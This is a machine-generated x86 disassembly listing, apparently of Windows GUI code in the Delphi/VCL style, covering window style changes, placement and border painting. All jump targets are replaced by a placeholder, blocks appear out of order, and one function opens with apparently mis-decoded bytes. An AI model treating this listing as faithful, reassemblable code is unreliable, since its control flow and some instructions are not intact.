cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_413cd4
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_413e60
sub_44482c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_4448fc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_43efc4
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_44488c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4448f0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4448f7
lea eax [ ebp - 0x4 ]
call sub_4056e0
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_40349c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4056f8
sub_444908
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43d44c
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_4449c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_413de4
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_413c88
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_40349c
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_444a20
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_444b16
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_40349c
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444b1d
mov eax [ ebp - 0x14 ]
call sub_4032a0
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_413e40
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_413de4
mov edi eax
mov eax edi
mov si 0xffb8
call sub_40349c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_444b2c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_444a20
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_444b58
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_455244
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_444a20
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_444a20
mov edx eax
mov eax esi
call sub_458eb0
sub_444b9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441328
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_444be4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4442a0
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43e068
sub_444c2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_444cb0
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4448fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_441328
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_445072
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_441328
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_444c2c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4412ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_445089
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_444cb0
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ee60
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4450c8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43fce4
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43d760
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_445110
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ff04
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_445140
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4448fc
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_440e90
xor ecx ecx
push ebp
push sub_44526f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_441328
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_441328
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445276
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_440e98
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4412ec
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_445276
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40349c
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_40349c
jmp r-xdata
sub_44530c
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43efc4
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43efc4
sub_445350
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_43efc4
sub_4453c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_445450
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4456b6
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41dc20
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42c584
call sub_42c664
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_42c584
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42cdb0
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
